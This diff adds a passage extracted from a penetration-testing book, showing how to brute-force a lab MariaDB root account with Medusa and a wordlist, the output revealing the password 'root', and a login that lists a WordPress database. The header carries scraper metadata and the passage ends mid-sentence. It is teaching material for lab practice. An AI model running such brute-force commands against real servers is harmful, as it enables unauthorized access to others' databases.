@@ -1,0 +1,50 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 01 - Brute-Forcing with Medusa
+Now that we can run attacks from Kali, we can use a preinstalled tool such as Medusa to brute-force the database. The following command uses Medusa’s mysql module, which works against MariaDB servers, to achieve the task:
+$ medusa -h 127.0.0.1 -u root -P /usr/share/metasploit-framework/data/
+wordlists/unix_users.txt -M mysql
+Security Relevance Score: 4
+Word Count: 288
+Extracted: 2025-06-13 23:40:57
+
+---
+
+Brute-Forcing with Medusa
+Now that we can run attacks from Kali, we can use a preinstalled tool such as Medusa to brute-force the database. The following command uses Medusa’s mysql module, which works against MariaDB servers, to achieve the task:
+$ medusa -h 127.0.0.1 -u root -P /usr/share/metasploit-framework/data/
+wordlists/unix_users.txt -M mysql
+
+We use the medusa command with the arguments -h (host), -u (user), -P (password file), and -M (module), specifying the 127.0.0.1 host, the root user, the password file /usr/share/metasploit-framework/data/wordlists/unix_users.txt, and mysql. Medusa will brute-force the root account by using a list of passwords from the unix_users.txt file. Let Medusa run for a few minutes until it finds the password:
+--snip--
+ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: redsocks
+ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rfindd
+ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: rje
+ACCOUNT CHECK: [mysql] Host: 127.0.0.1 User: root Password: root
+ACCOUNT FOUND: [mysql] Host: 127.0.0.1 User: root Password: root [SUCCESS]
+
+Great, Medusa found that the password for the root user is root. Let’s try to connect to the database. From Kali, run the following command:
+$ mysql -h 127.0.0.1 -u root -p
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 32
+--snip--
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]>
+
+Next, enumerate the available databases by using the show databases command:
+$ MariaDB [(none)]> show databases;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+
+As you can see, we’ve found a WordPress database. Let’s connect some dots: this c-db-02 server is probably the backend database of the WordPress instance running on p-web-
